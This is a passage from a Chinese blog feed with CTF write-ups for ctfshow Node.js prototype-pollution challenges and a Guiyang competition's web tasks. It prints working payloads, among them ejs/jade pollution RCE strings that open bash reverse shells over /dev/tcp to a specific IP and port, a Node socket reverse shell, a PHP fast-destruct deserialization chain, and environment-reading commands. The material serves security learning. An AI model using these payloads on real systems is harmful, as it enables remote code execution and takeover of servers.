alt="img"></p><p>当secert对象的ctfshow属性为题目所需值就给flag</p><p>那么就通过原型链污染Object的ctfshow属性 从而使得secert对象为所需值</p><p>可利用点为这个copy函数 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683559440720-45034e2c-417e-47c8-a101-9e188bd902f2.png" alt="img"></p><p>跟踪一下</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683559770866-5f796f05-3f52-4681-9481-efbeeb866d8d.png" alt="img"></p><p>发现了原型链污染的经典语句</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683558958836-ddb03c4f-d761-4df2-8cc7-f9abcf68303e.png" alt="img"></p><p>当时做这道题题目时候有个疑问就是为什么post传输的数据是在哪里接受到的，因为是零基础js，还在慢慢摸索，又去审了一次代码</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683598380991-64209db3-a460-4b75-afe7-df8776ea2216.png" alt="img"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_ invoke__">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_ invoke__">json</span>(),<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整个语句都是<code>router&#123;&#125;</code>囊括起来的,并且是通过post传参，而且还加载了<code>require(&#39;body-parser&#39;)</code>中间键。</p><p>body-parser是非常常用的一个express中间件，作用是对post请求的请求体进行解析  。</p><p>除此之外为什么要用json格式传输，p神博客中也提及了，如果不用json文件发送那么<code>__proto__</code>就会被当作原型执行，导致污染失败，只有通过json格式提交，才会被当作key来执行，这样才能达到原型链污染的效果。</p><p>关于nodejs请求 可以参考这篇文章比较符合我这种新手：<a href="https://www.cnblogs.com/Diamond-sjh/p/11324138.html">https://www.cnblogs.com/Diamond-sjh/p/11324138.html</a></p><h1 id="Web-339-api"><a href="#Web-339-api" class="headerlink" title="Web-339 (api)"></a>Web-339 (api)</h1><p>这道题目多了一个&#x2F;api路由 并且看到了render 多了一个模板渲染</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683637579498-c75155d1-168c-4366-9602-d3ef54456d8a.png" alt="img"></p><p>发现Function 这里借用p神的理解</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683637631439-cf02616e-fcbb-443e-9873-bee89aeaab0d.png" alt="img"></p><p>这里query没有被定义，就会在Object对象中寻找这个属性，那么我们就向上污染Object添加一个query属性就行了 。</p><p>这里提供三种payload:</p><p>payload1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p><code>outputFunctionName</code>是ejs引擎的一个属性 可以参考：<a href="https://blog.csdn.net/DARKNOTES/article/details/124000520">https://blog.csdn.net/DARKNOTES/article/details/124000520</a></p><p>payload2:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&quot;&#x27;)&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>没有require，所以就用 <code>global.process.mainModule.constructor._load</code>来导入 child_process</p><p>payload3:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;var net = process.mainModule.constructor._load(&#x27;net&#x27;),cp = process.mainModule.constructor._load(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(port,&#x27;ip&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p> Function环境下没有require函数，不能获得child_process模块，我们可以通过使用<code>process.mainModule.constructor._load</code>来代替require。  </p><p>然后flag藏在环境变量里 一开始被这个坑到了</p><h1 id="Web-340-二次污染"><a href="#Web-340-二次污染" class="headerlink" title="Web-340(二次污染)"></a>Web-340(二次污染)</h1><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683638759001-e1aa0968-7e8c-4aaf-958b-81ea9f963718.png" alt="img"></p><p>这里user为一个对象 他的属性userinfo也是一个对象 </p><p>那么如果我们想通过copy函数通过<code>user.userinfo</code>污染到<code>Object.prototype</code></p><p>即则<code>user.userinfo-&gt;user(第一次污染)-&gt;Object(第二次污染)</code>需要污染两次</p><p>路由&#x2F;api的思路和上一题一样 则可以用上题的payload，嵌套一个__proto__即可</p><p> <code>&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/124.221.177.174/7777 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;</code></p><h1 id="Web-341-ejs模板"><a href="#Web-341-ejs模板" class="headerlink" title="Web-341(ejs模板)"></a>Web-341(ejs模板)</h1><p>没了&#x2F;api路由</p><p>也没有了条件输出flag</p><p>看了wp是ejs的模板引擎的原型链污染rce</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683644860927-cc3a4cc9-9c22-403c-bc3c-c1af74831522.png" alt="img"></p><p>那么既然没有条件Function函数让我们执行命令，也没有输出flag，该怎么弄呢</p><p>整体分析可参考：<a href="https://www.anquanke.com/post/id/236354#h2-2">https://www.anquanke.com/post/id/236354#h2-2</a></p><p>大致思路为：通过原型链污染 去覆盖这个模板渲染时的拼接代码，让其拼接进ejs模板代码种，从而渲染时进行RCE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/124.221.177.174/7777 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="Web-342、343-jade模板"><a href="#Web-342、343-jade模板" class="headerlink" title="Web-342、343(jade模板)"></a>Web-342、343(jade模板)</h1><p>审计源码，发现换了模板引擎</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683684596147-6e4fef35-4a8e-416b-a460-35b266724fe8.png" alt="img"></p><p>思路与上面ejs模板相同 直接看师傅们的payload即可</p><ol><li><code>&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;type&quot;:&quot;Block&quot;,&quot;nodes&quot;:&quot;&quot;,&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/124.221.177.###/7777 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;</code></li><li><code>&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;type&quot;:&quot;Block&quot;,&quot;nodes&quot;:&quot;&quot;,&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/124.221.###.174/7777 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;</code></li><li><code>&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash -c \&quot; bash -i &gt;&amp;/dev/tcp/124.221.177.###/7777 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;</code></li></ol><p>注意这里有两个大坑 坑死我了</p><p>首先提交要post burp默认get</p><p>最坑的是Content-Type要改为 <code>application/json</code>玛德当时这里一直是默认的 一直没改 导致一直反弹失败</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683684527595-86a87036-1fd4-40cb-8708-94c204bd0d1c.png" alt="img"></p><p>然后再来说说找flag的方法 </p><p>直接<code>cat /proc/self/environ</code>去找</p><p>或者<code>env|grep ctfshow</code> 其实就是管道符把env的输出的内容当作grep(查找字符)的参数</p><p>其实本质上这两者是等价的 都是在环境变量种寻找flag</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683684961708-f7e1d476-7428-4704-a807-1a67cacfe7ba.png" alt="img"></p><h1 id="Web-344-nodejs-解析特性"><a href="#Web-344-nodejs-解析特性" class="headerlink" title="Web-344(nodejs 解析特性)"></a>Web-344(nodejs 解析特性)</h1><p>给了源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag = <span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">url</span>.<span class="title function_">match</span>(<span class="regexp">/8c|2c|\,/ig</span>))&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> query = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">query</span>.<span class="property">query</span>);</span><br><span class="line">  <span class="keyword">if</span>(query.<span class="property">name</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;query.<span class="property">password</span>===<span class="string">&#x27;ctfshow&#x27;</span>&amp;&amp;query.<span class="property">isVIP</span>===<span class="literal">true</span>)&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag. :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>根据源码我们应该传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?query=&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:&quot;true)&quot;&#125;</span><br></pre></td></tr></table></figure><p><code>req.url.match(/8c|2c|\,/ig)</code>但是正则过滤了空字符 逗号以及其url编码 </p><p> 看了大佬的wp 应该这样传<code>?query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;ctfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125;</code> url编码之后传上去</p><p> nodejs中会把这三部分拼接起来 </p><p>被传入之后req.query被解析成了一个数组，之后在JSON.parse的解析下变成了对象，就变成了我们想要的结果了。</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nodejs原型链污染 </tag>
            
            <tag> nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>贵阳大数据及网络安全精英对抗赛WEB部分WP</title>
      <link href="/post/232bb69.html"/>
      <url>/post/232bb69.html</url>
      
        <content type="html"><![CDATA[<p>贵阳大数据及网络安全精英对抗赛WEB部分WP</p><span id="more"></span><h1 id="仔细ping"><a href="#仔细ping" class="headerlink" title="仔细ping"></a>仔细ping</h1><p>有点看不懂的一道题目，ip去ping，返回和我们本地ping网站差不多的回显，刚开始是以为用逻辑符<code>|&amp;&amp;</code>之类的题目来做，后来发现想复杂了，他题目意思好像只能用他指定的命令，除此之外其他字符一律屏蔽</p><p>比如 <code>?ip=ls</code>就可以合法，但是如果<code>?ip=l</code>一个字符也会被屏蔽，蛮nt的说实话。</p><p>payload:<code>?id=ls</code></p><p>发现本地有flag.php</p><p>直接 <code>?id=nl flag.php</code></p><h1 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TT</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;key;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;welcome&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JJ</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    (<span class="variable language_">$this</span> -&gt; obj)();</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"><span class="variable">$c</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MM</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    (<span class="variable language_">$this</span>-&gt;name)(<span class="variable language_">$this</span>-&gt;c);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ok,but wrong&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hacker!&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;bbb&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;NoNoNo&quot;</span>);</span><br></pre></td></tr></table></figure><p>整个链子其实不难 当时做这道题目 本地pop链已经写出来了 但是发现没法触发 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TT</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JJ</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MM</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">TT</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;key = <span class="keyword">new</span> <span class="title function_ invoke__">JJ</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;key-&gt;obj=<span class="keyword">new</span> <span class="title function_ invoke__">MM</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;key-&gt;obj-&gt;name =<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;key-&gt;obj-&gt;c=<span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#O:2:&quot;TT&quot;:2:&#123;s:3:&quot;key&quot;;O:2:&quot;JJ&quot;:1:&#123;s:3:&quot;obj&quot;;O:2:&quot;MM&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;system&quot;;s:1:&quot;c&quot;;s:9:&quot;cat /flag&quot;;&#125;&#125;s:1:&quot;c&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure><p>然后就会发现<code>throw new Error(&quot;NoNoNo&quot;);</code>会挡在前面没法绕过，当时就寄了。</p><p>这里考到了fast destruct的知识点 出自：<a href="https://zhuanlan.zhihu.com/p/405838002">https://zhuanlan.zhihu.com/p/405838002</a></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683425847710-d16be9c0-ad73-4d77-a90b-d1ddc07075b6.png" alt="img"></p><p>其实原理还是蛮容易理解的，当一个对象生命周期结束时，最后就会触发析构函数，但是如果我们提前破坏这个序列化后的结构，那么就会提前进入析构函数</p><p>这道题目就是因为<code>throw new Error(&quot;NoNoNo&quot;);</code>而进不去我们构造的链子 但是如果我们破坏我们payload链子结构 那么就会提前进入析构函数 从而触发链子</p><p>payload：<code>?bbb=O:2:&quot;TT&quot;:2:&#123;s:3:&quot;key&quot;;O:2:&quot;JJ&quot;:1:&#123;s:3:&quot;obj&quot;;O:2:&quot;MM&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;system&quot;;s:1:&quot;c&quot;;s:6:&quot;whoami&quot;;&#125;&#125;s:1:&quot;c&quot;;N;&#125;</code></p><p>这样是完整链子没法触发的我们可以删除最后一个<code>&#125;</code>破坏结构让他提前进入析构函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?bbb=O:2:&quot;TT&quot;:2:&#123;s:3:&quot;key&quot;;O:2:&quot;JJ&quot;:1:&#123;s:3:&quot;obj&quot;;O:2:&quot;MM&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;system&quot;;s:1:&quot;c&quot;;s:6:&quot;whoami&quot;;&#125;&#125;s:1:&quot;c&quot;;N;</span><br></pre></td></tr></table></figure><p>成功</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683426171520-63fa6be1-39b7-446d-8fc7-98f8d3e0a425.png" alt="img"></p><h1 id="完美网站"><a href="#完美网站" class="headerlink" title="完美网站"></a>完美网站</h1><p>一道很臭的题目，大概题目思路是他给了一个img参数是一个图片格式base64编码 然后还需要提交一个n参数 但是n是一个10-30的随机数字 并且每次都不一样 那么其实思路很简单直接爆破就行了 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683427463745-906d989e-5129-4618-98ae-64fc1c6c5efb.jpeg" alt="img"></p><p>并且要同时提交img和n 但是这描述我也是无语</p><p>然后当时没发现flag文件名藏在他给的img末尾是ffffpq.php  所以一直在找flag </p><p>总之做的很恶心人 像吃了屎一样yue了</p><h1 id="notrce"><a href="#notrce" class="headerlink" title="notrce"></a>notrce</h1><p>好像我没记错应该是这道题目</p><p>源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/vi|less|tail|head|od|sh|echo|touch|re|mv|rm|cat|ls|tac|more|cut|curl|wget|base|&gt;|&lt;|`|\*|\\$|\\\/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>蛮玄幻的一道题目 看了wp直接用将根目录flag复制到当前目录访问就行 </p><p>呢如果flag文件目录不是常规命名 这不就寄了吗</p><p>之后了解到是非预期解 哦 那没事了:)</p><h1 id="JUST-PROTO"><a href="#JUST-PROTO" class="headerlink" title="JUST_PROTO"></a>JUST_PROTO</h1><p>一道我未触及的领域的题目 一道nodejs的原型链污染题目</p><p>这两天恶补了一下关于原型链污染的知识点，感受颇深</p><p>如果之前了解过这个 其实题目一眼丁真就能看出是原型链污染的题目 <code>__proto__</code>明显就提示了</p><p>给出源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> res.<span class="title function_">send</span>(<span class="string">&#x27;嗨嗨嗨！！老八来了！！！&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> ba = &#123;</span><br><span class="line">  <span class="attr">baba</span>: <span class="function">(<span class="params">token</span>)=&gt;</span>&#123; <span class="keyword">return</span> !!token &#125;,</span><br><span class="line">  <span class="attr">bababa</span>: <span class="function">()=&gt;</span>&#123; <span class="keyword">if</span> (<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(date).<span class="property">length</span> &gt; <span class="number">10000</span>) date = &#123;&#125; &#125;, </span><br><span class="line">  <span class="comment">// set: `redis-cli -h $&#123;ba.redis_host&#125; set `</span></span><br><span class="line">  <span class="comment">// get: `redis-cli -h $&#123;ba.redis_host&#125; get `</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> date = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/set&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  ba.<span class="title function_">bababa</span>(); </span><br><span class="line">  <span class="keyword">const</span> &#123;token, key, val&#125; = req.<span class="property">query</span>;</span><br><span class="line">  <span class="keyword">if</span> (!ba.<span class="title function_">baba</span>(token) || !val) <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;wrong&quot;</span>); </span><br><span class="line">  date[token][key] = val; </span><br><span class="line">  res.<span class="title function_">json</span>(&#123; <span class="attr">is_succ</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/get&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123;token, key&#125; = req.<span class="property">query</span>;</span><br><span class="line">  <span class="keyword">if</span> (!ba.<span class="title function_">baba</span>(token)) <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;wrong&quot;</span>);</span><br><span class="line">  <span class="keyword">let</span> result = date[token];</span><br><span class="line">  <span class="keyword">if</span> (result) result = result[key];</span><br><span class="line">  res.<span class="title function_">json</span>(&#123; <span class="attr">result</span>: result === <span class="literal">undefined</span> ? <span class="string">&quot;null&quot;</span> : result, <span class="attr">is_succ</span>: result !== <span class="literal">undefined</span> &#125;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">put</span>(<span class="string">&#x27;/bkup&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> date_stream = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(date)); </span><br><span class="line">  <span class="keyword">const</span> cmd = ba.<span class="property">redis_set</span> + <span class="string">`date <span class="subst">$&#123;date_stream.toString(<span 